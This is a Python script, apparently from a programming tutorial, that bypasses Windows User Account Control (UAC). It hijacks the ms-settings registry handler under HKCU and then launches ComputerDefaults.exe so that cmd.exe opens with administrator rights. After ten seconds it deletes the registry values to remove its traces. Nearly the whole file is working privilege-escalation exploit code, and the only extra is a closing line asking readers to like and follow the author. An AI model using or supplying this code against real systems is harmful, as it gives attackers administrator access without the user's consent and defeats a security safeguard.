import sys
import winreg
import subprocess
import time

def create_reg_key(key, value):
    #指定注册表键添加键值对
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
    
def delete_reg_key(key):
    #指定注册表键删除键值对
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)                
        winreg.DeleteValue(registry_key,key)     
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def restore():
    #还原注册表
    try:
        delete_reg_key('DelegateExecute')
        delete_reg_key(None)
    except WindowsError:
        raise
    
def exec_bypass_uac(cmd):
    #写入两个键值
    try:
        #创建无数据的HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的值
        create_reg_key('DelegateExecute', '')
        #将要以管理员权限启动的程序的数据写入HKCU\Software\Classes\ms-settings\shell\open\command\(default)的值中
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def bypass_uac():        
 try:                
    cmd = r"cmd.exe"                    
    fake_cmd = r'E:\windows\system32\ComputerDefaults.exe'
    exec_bypass_uac(cmd)                #修改注册表，以管理权限命令行绕过UAC
    subprocess.run(fake_cmd,shell=True) #执行ComputerDefaults
    time.sleep(10)                      #等待10秒钟还原注册表
    restore()
    return 1               
 except WindowsError:
    sys.exit(1)       

if __name__ == '__main__':
    if bypass_uac():
        print("点赞关注唐老师编程~~谢谢支持")















        
